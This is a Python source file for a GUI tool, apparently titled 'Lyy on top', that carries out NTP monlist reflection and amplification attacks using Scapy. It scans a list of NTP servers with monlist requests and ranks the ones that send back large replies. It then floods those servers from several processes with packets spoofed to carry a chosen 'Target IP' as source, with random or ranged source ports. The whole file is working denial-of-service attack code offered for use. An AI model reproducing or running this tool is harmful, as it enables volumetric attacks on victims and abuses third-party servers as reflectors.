import base64
import tkinter as tk
from collections import Counter
from multiprocessing import Process, Value, freeze_support
from tkinter import filedialog, messagebox, scrolledtext
import threading
import time
from scapy.all import *
from logo import *

sending = Value('i', 0)


def stop_filter(stop_event):
    return stop_event.is_set()


def sniffer(collected_ips, all_packets, stop_event, adepter):
    # Sniffs incoming network traffic on UDP port 123
    sniff(filter="udp port 123", store=0, prn=lambda p: analyser(p, collected_ips, all_packets),
          iface="WLAN", stop_filter=lambda x: stop_filter(stop_event))


def analyser(packet, collected_ips, all_packets):
    if len(packet) > 200 and packet.haslayer(IP):
        ip_src = packet.getlayer(IP).src
        all_packets.append(ip_src)
        if ip_src not in collected_ips:
            collected_ips.append(ip_src)


def get_available_monlist_servers(monlist_path, scantimes=2, fliter_magnification='1', adepter="WLAN", scandelay=0.02):
    collected_ips = []  # List to store collected IPs
    all_packets = []
    stop_event = threading.Event()  # Create a stop event

    # Start the sniffer thread
    sniffer_thread = threading.Thread(target=sniffer, args=(collected_ips, all_packets, stop_event, adepter))
    sniffer_thread.start()

    # Send packets to each address from the monlist file
    for i in range(scantimes):
        with open(monlist_path, 'r', encoding='utf-8') as logfile:
            for address in logfile:
                address = address.strip()
                send(IP(dst=address) / UDP(sport=123, dport=123) / Raw(load=b"\x17\x00\x03\x2a" + b"\x00" * 44),
                     verbose=0, iface=adepter)
                time.sleep(scandelay)
    time.sleep(5)
    # Set the stop event to signal the sniffer to stop
    stop_event.set()
    # send a packet to trigger the stop event
    send(IP(dst="127.0.0.1") / UDP(sport=123, dport=123) / Raw(load="shutdown"), iface=adepter, verbose=0)

    # Wait for the sniffer thread to finish
    sniffer_thread.join()
    count = Counter(all_packets)

    # 排序完成

    # 筛选出发包次数较多的反弹服务器
    if fliter_magnification == 'disable':
        sorted_count = list(dict(sorted(count.items(), key=lambda item: item[1], reverse=True)).keys())
        return sorted_count, sorted_count

    result = list(dict(
        sorted(((key, value) for key, value in count.items() if value > int(fliter_magnification) * scantimes),
               key=lambda item: item[1], reverse=True)).keys())
    return result, result  # Return the collected IPs list


def send_packets_(text, target_ip, target_port, sending, adepter):
    ntp_servers = text.split('\n')
    if target_port == 'random':
        while sending.value:
            mpacket = IP(src=target_ip, dst=ntp_servers) / UDP(sport=random.randint(1, 65535), dport=123) / Raw(
                load=b"\x17\x00\x03\x2a" + b"\x00" * 44)
            send(mpacket, verbose=0, iface=adepter)
    elif '-' in target_port:
        ports = target_port.split('-')
        print(ports)
        while sending.value:
            mpacket = IP(src=target_ip, dst=ntp_servers) / UDP(sport=random.randint(int(ports[0]), int(ports[1])),
                                                               dport=123) / Raw(
                load=b"\x17\x00\x03\x2a" + b"\x00" * 44)
            send(mpacket, verbose=0, iface=adepter)
    else:
        mpacket = IP(src=target_ip, dst=ntp_servers) / UDP(sport=int(target_port), dport=123) / Raw(
            load=b"\x17\x00\x03\x2a" + b"\x00" * 44)
        while sending.value:
            send(mpacket, verbose=0, iface=adepter)


class PacketSenderApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Lyy on top")

        # Variables
        self.scandelay = tk.DoubleVar(value=0.02)
        self.scantimes = tk.IntVar(value=2)
        self.adepter = tk.StringVar(value='WLAN')
        self.monlist_path = tk.StringVar()
        self.target_ip = tk.StringVar(value=get_if_addr('WLAN'))
        self.process_count = tk.IntVar(value=1)
        self.target_port = tk.StringVar(value='random')
        self.check_servers = tk.BooleanVar()
        self.magnification = tk.StringVar(value='disable')

        # UI Elements
        tk.Label(master, text="Monlist File:").grid(row=0, column=0)
        tk.Entry(master, textvariable=self.monlist_path).grid(row=0, column=1)
        tk.Button(master, text="Browse", command=self.browse_monlist).grid(row=0, column=2)

        tk.Label(master, text="Target IP:").grid(row=1, column=0)
        tk.Entry(master, textvariable=self.target_ip).grid(row=1, column=1)

        tk.Label(master, text="Target port:").grid(row=2, column=0)
        tk.Entry(master, textvariable=self.target_port).grid(row=2, column=1)

        tk.Label(master, text="Process Count:").grid(row=3, column=0)
        tk.Entry(master, textvariable=self.process_count).grid(row=3, column=1)

        self.start_button = tk.Button(master, text="Start Sending", command=self.start_stop_sending)
        self.start_button.grid(row=4, columnspan=3)

        self.check_button = tk.Button(master, text="Check Available Servers", command=self.check_available_servers)
        self.check_button.grid(row=5, columnspan=3)

        # 文本框：显示可用的 NTP 服务器
        self.server_text = scrolledtext.ScrolledText(master, width=40, height=10)
        self.server_text.grid(row=6, columnspan=3)

        tk.Label(master, text="Magnification filter:").grid(row=7, column=0)
        tk.Entry(master, textvariable=self.magnification).grid(row=7, column=1)

        tk.Label(master, text="Net Adepter").grid(row=8, column=0)
        tk.Entry(master, textvariable=self.adepter).grid(row=8, column=1)

        tk.Label(master, text="Scan times").grid(row=9, column=0)
        tk.Entry(master, textvariable=self.scantimes).grid(row=9, column=1)

        tk.Label(master, text="Scan Delay(s)").grid(row=10, column=0)
        tk.Entry(master, textvariable=self.scandelay).grid(row=10, column=1)

        self.is_sending = 0

        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)

    def on_closing(self):
        if self.is_sending:
            if messagebox.askyesno("Confirm", "Packets are currently being sent. Do you really want to exit?"):
                self.is_sending = 0
                sending.value = 0
                self.master.destroy()  # 关闭窗口
        else:
            self.master.destroy()  # 直接关闭窗口

    def browse_monlist(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        self.monlist_path.set(file_path)
        if not os.path.exists(self.monlist_path.get()):
            return
        with open(file_path, 'r', encoding='utf-8') as f:
            self.server_text.delete(1.0, tk.END)
            self.server_text.insert(tk.END, f.read())

    def start_stop_sending(self):
        if not self.is_sending:
            process_count = self.process_count.get()
            self.is_sending = 1
            self.start_button.config(text="Stop Sending")

            text = self.server_text.get(1.0, tk.END)
            target_ip = self.target_ip.get()
            target_port = self.target_port.get()
            sending.value = 1
            for i in range(process_count):
                Process(target=send_packets_, args=(text, target_ip, target_port, sending, self.adepter.get())).start()
        else:
            self.is_sending = 0
            sending.value = 0
            self.start_button.config(text="Start Sending")

    def check_available_servers(self):
        monlist_path = self.monlist_path.get()
        _, servers = get_available_monlist_servers(monlist_path, fliter_magnification=self.magnification.get(),
                                                   adepter=self.adepter.get(), scandelay=self.scandelay.get(),
                                                   scantimes=self.scantimes.get())  # 假设这个函数返回可用的服务器列表

        self.server_text.delete(1.0, tk.END)  # 清空文本框
        for server in servers:
            self.server_text.insert(tk.END, f"{server}\n")  # 在文本框中添加可用服务器
        return servers


if __name__ == "__main__":
    freeze_support()
    root = tk.Tk()

    icon = open("gui_icon.ico", "wb+")
    icon.write(base64.b64decode(img))  # 写入到临时文件中
    icon.close()
    root.iconbitmap("gui_icon.ico")  # 设置图标
    os.remove("gui_icon.ico")  # 删除临时图标

    app = PacketSenderApp(root)
    root.mainloop()
